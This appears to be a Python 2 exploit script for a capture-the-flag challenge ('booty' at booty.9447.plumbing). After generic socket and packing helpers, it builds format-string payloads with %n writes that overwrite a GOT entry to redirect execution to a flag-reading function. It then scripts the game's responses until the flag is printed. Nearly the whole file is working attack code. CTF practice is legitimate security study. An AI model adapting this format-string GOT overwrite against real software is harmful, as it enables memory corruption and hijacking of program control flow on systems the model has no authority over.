__author__ = 'HuyNA'
import socket, time
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(10)
        buf += c
        if delim in buf:
            break
    return buf
#
def recv_until_print(sock, delim):
    buf = ""
    while True:
        c = sock.recv(30)       # chuan them vao moi in flag do dong bo
        print(c),
        buf += c
        if delim in buf:
            break
    return buf

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop

def send(s, m):
    print "[SEND]", m
    s.send(m)

def recv(s):
    t = s.recv(4096)
    print "[RECV]", t
    return t

#socat TCP-LISTEN:9446,reuseaddr,fork EXEC:./booty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(( "booty.9447.plumbing",9447 ))
#s.connect(("192.168.248.129",9446))

#raw_input(1)

write_string = [5]
count = 31
write_string.append('%168u%'+str(count)+'$n')
write_string.append('%199u%'+str(count+1)+'$n')
write_string.append('%1661u%'+str(count+2)+'$n')
write_string.append('%120u%'+str(count+3)+'$n')

write_string1 = ''
for i in xrange(1,4):
    write_string1 += write_string[i]

ReadFlagAddress_ = 0x080487C0
ReadFlagAddress = 0x0804A138    # got table
format_string = 'xxxx'+pi(ReadFlagAddress)+pi(ReadFlagAddress+1)+pi(ReadFlagAddress+2)+pi(ReadFlagAddress+3)+'%'+'_'*3+write_string1

format_string2 = 'yyyy'+pi(ReadFlagAddress)+pi(ReadFlagAddress+1)+pi(ReadFlagAddress+2)+pi(ReadFlagAddress+3)+'_'

print recv_until(s,'> ')
send(s, format_string+"\n")

lv = 0

p1 = "flex their muscles"
p2 = "starts to tense up"
p3 = "is looking exhausted"

while 1:
    time.sleep(0.7)
    #st = recv(s)
    st = recv_until(s,'> ')
    #print st
    if "LEVEL" in st:
        lv += 1
    if p1 in st:
        send(s, "h\n")
    elif p2 in st:
        send(s, "r\n")
    elif p3 in st:
        send(s, "p\n")
    else:
        break

s.send('y\n')
#print s.recv(55)
print recv_until(s,'> > ')
s.send(format_string2+'\n')

# them 1 lan dau -
lv=0
while 1:
    time.sleep(0.7)
    #st = recv(s)
    if lv==8:
        st = recv_until_print(s,'> ')#;print st
    else:
        st = recv_until(s,'> ')
    if "LEVEL" in st:
        print lv
        lv += 1
    if 'HAIL THE NEW PIRATE KING' in st:
        print 'Flag: ....'
        break
    if p1 in st:
        send(s, "h\n")
    elif p2 in st:
        send(s, "r\n")
    elif p3 in st:
        send(s, "p\n")
    else:
        print 'break loop'
        break


print s.recv(1024)
print s.recv(1024)
print s.recv(1024)
print s.recv(1024)
print s.recv(1024)


s.close()